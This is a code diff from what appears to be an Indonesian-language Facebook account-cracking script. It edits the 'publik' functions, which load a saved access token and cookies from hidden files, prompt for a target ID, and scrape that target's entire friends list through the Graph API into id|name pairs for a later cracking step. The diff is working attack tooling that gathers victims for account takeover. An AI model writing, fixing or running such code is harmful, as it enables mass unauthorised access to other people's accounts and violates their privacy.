@@ -757,24 +757,6 @@ def publikv2():
 
 
 #----------[ CRACK-PUBLIK  ]----------#   
-def publik():
-	t = open('.token.txt','r').read()
-	c = open ('.cok.txt','r').read()
-	akun = input(f'╠───[{hh}!{P}] PASTIKAN ID TARGET BERSIFAT PUBLIK \n╠───[{hh}!{P}] MASUKKAN ID : ')
-	ses=requests.Session()
-	try:
-		params = {
-			"access_token": t, 
-			"fields": "name,friends.fields(id,name)"
-		}
-		bas = ses.get("https://graph.facebook.com/{}".format(akun),params=params,cookies=c).json()
-		for pi in bas['friends']['data']:
-			id.append(pi['id']+'|'+pi['name'])
-		setting()
-	except (KeyError,IOError):
-		exit(f"╠───[{hh}!{P}] AKUN TIDAK PUBLIK")	
-		
-
 def publiikk():
     try:
         token = open('.token.txt','r').read()
@@ -795,14 +777,14 @@ def publiikk():
             print(e)
 	      
 #-------------------[ CRACK-PUBLIK ]----------------#
-def publikcv():
+def publik():
     with requests.Session() as ses:
         token = open('.token.txt','r').read()
         cok = open('.cok.txt','r').read()	
         prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik dan tidak private""",width=60,style=f"{color_panel}"))
         a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
         try:
-            b = ses.get('https://graph.facebook.com/v17.0/'+a+'?fields=friends.limit(999999999)&access_token='+tokenmu[0], cookies = {'cookies':cok}).json()
+            b = ses.get('https://graph.facebook.com/v17.0/'+a+'?fields=friends.limit(999999999)&access_token={}'.format(token), cookies = {'cookies':cok}).json()
             for c in b["friends"]["data"]:
                 id.append(c["id"]+"|"+c["name"])
             setting()
